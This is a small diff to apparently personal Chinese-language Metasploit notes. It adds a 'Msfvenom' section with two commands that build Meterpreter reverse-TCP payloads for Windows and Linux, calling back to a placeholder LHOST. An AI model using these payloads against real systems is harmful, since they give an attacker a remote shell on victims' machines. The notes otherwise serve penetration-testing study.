@@ -18,6 +18,13 @@ msfdb init   # 初始化数据库
 
 之后便可以使用数据库相关指令, 关键信息会被记录到数据库中以便后续查询.  
 
+## Msfvenom
+
+```sh
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ip] -f exe -o ~/payload.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] -f elf -o ~/payload
+```
+
 ## 后渗透测试
 
 ```sh
